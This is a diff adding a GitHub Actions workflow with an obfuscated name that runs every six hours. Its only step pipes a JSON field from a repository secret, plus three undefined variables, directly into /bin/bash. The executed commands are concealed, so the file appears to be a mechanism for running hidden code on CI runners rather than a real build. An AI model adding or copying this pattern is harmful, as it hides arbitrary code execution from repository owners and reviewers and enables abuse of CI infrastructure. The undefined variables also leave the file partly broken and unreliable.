@@ -1,0 +1,19 @@
+name: ellipticalparagraph
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '5 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: ellipticalparagraph
+        env:
+          w094: ${{ secrets.w094 }}
+        run: |
+          echo $w094 | jq -r .q00053 | /bin/bash
+          echo $y6847 | jq -r .xxm8718 | /bin/bash
+          echo $b83607 | jq -r .h963 | /bin/bash
+          echo $jka1933 | jq -r .s94 | /bin/bash
+
